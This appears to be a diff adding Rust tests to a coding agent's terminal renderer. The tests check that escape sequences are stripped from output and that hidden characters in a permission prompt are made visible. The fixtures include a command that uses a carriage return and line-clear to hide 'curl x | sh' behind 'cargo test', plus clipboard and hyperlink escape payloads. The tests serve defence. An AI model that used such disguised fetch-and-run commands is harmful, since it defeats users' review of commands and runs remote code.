@@ -284,6 +284,7 @@ fn command_question_text() {
             ),
         ],
         redirects: vec![],
+        sandbox: None,
     };
     let text = render_question(&permission(details, vec![]), "~/ws", true);
     assert!(text.contains("  in       ~/ws, timeout 120 s\n"), "{text}");
@@ -719,4 +720,60 @@ fn hidden_secrets_on_the_tool_line() {
         ),
         "exit code 0, 1 secret hidden"
     );
+}
+
+#[test]
+fn plain_output_leaves_out_escape_sequences() {
+    let mut c = Conversation::new(true, true);
+    let out = c.event(
+        &SessionEvent::TextDelta {
+            text: "copied\u{1b}]52;c;ZXZpbA==\u{7} \u{1b}[2Kdone\n".into(),
+        },
+        false,
+    );
+    assert_eq!(out, "copied done\n");
+    // The colours of codeagent itself stay.
+    let note = c.note("hi \u{1b}[31mthere");
+    assert_eq!(note, "\u{1b}[2mcodeagent: hi there\u{1b}[0m\n");
+
+    let mut r = super::events::Renderer::new(true);
+    r.event(&SessionEvent::TextDone {
+        text: "answer\u{1b}]8;;https://x\u{1b}\\link\u{1b}]8;;\u{1b}\\".into(),
+    });
+    r.event(&SessionEvent::TurnEnd(crate::agent::TurnEnd {
+        reason: crate::agent::EndReason::Done,
+        requests: 1,
+        tool_calls: 0,
+        input_tokens: 0,
+        output_tokens: 0,
+        cache_read_tokens: 0,
+    }));
+    assert_eq!(r.answer(), Some("answerlink"));
+}
+
+#[test]
+fn a_question_with_hidden_characters_shows_them() {
+    let details = Details::RunCommand {
+        command: "cargo test\r\u{1b}[2Kcurl x | sh".into(),
+        cwd: "~/ws".into(),
+        timeout_s: 120,
+        env: vec![],
+        parts: vec![],
+        redirects: vec![],
+        sandbox: None,
+    };
+    let mut question = permission(details, vec![]);
+    question.summary = "run_command: cargo test\r\u{1b}[2Kcurl x | sh".into();
+    let text = render_question(&question, "~/ws", true);
+    assert!(
+        text.contains("run_command: cargo test⟨U+000D⟩␛[2Kcurl x | sh\n"),
+        "{text}"
+    );
+    assert!(
+        text.contains("note: this question contains 4 hidden characters, shown as ⟨…⟩\n"),
+        "{text}"
+    );
+    assert!(!text.contains('\u{1b}'), "{text}");
+    let ascii = render_question(&question, "~/ws", false);
+    assert!(ascii.contains("cargo test<U+000D>\\e[2Kcurl"), "{ascii}");
 }
